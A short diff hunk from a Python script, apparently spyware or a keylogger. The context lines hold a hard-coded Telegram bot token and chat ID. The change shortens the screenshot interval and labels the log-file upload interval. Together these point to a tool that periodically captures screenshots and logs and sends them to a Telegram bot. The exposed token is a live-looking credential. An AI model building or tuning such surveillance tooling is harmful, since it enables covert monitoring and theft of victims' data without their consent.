@@ -22,8 +22,8 @@ TOKEN = "7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA"  # Telegram API Token
 CHAT_ID = "5818909184"  # Telegram Chat ID
 
 # Constants
-INTERVAL = 60
-SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots (in seconds)
+INTERVAL = 60   # Interval of upload log file (in seconds)
+SCREENSHOT_INTERVAL = 40  # Interval for taking screenshots (in seconds)
 
 # Determine the temporary directory based on the OS
 temp_dir = gettempdir()
